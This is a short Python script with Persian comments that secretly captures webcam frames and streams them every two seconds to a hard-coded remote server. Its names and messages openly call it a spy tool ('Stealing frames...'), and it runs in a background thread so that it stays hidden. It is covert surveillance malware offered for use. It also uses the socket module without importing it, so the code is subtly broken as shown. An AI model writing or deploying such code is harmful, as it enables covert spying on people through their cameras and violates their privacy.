import cv2
import threading
import time

# تنظیمات سرور
TARGET_IP = "192.168.1.100"
PORT = 5555

def send_frame(frame, sock):
    try:
        # تبدیل تصویر به بایت
        _, buffer = cv2.imencode('.jpg', frame)
        data = buffer.tobytes()
        # ارسال طول داده برای جلوگیری از بهم ریختگی
        sock.send(len(data).to_bytes(4, byteorder='big') + data)
    except Exception as e:
        print(f"Error sending frame: {e}")

def start_camera_spy():
    # باز کردن دوربین (0 معمولاً دوربین اصلی است)
    cap = cv2.VideoCapture(0)
    
    if not cap.isOpened():
        print("Camera not found or permission denied.")
        return

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((TARGET_IP, PORT))
        print("Connected to spy server. Stealing frames...")

        while True:
            ret, frame = cap.read()
            if not ret:
                break
            
            # ارسال فریم به سرور
            send_frame(frame, sock)
            
            # تنظیم تاخیر برای جلوگیری از پر شدن باند (هر 2 ثانیه یک عکس)
            time.sleep(2)
            
    except Exception as e:
        print(f"Connection error: {e}")
    finally:
        cap.release()
        sock.close()

if __name__ == "__main__":
    # اجرای در پس‌زمینه برای مخفی ماندن
    t = threading.Thread(target=start_camera_spy, daemon=True)
    t.start()
    
    # نگه داشتن اسکریپت زنده
    while True:
        time.sleep(1)

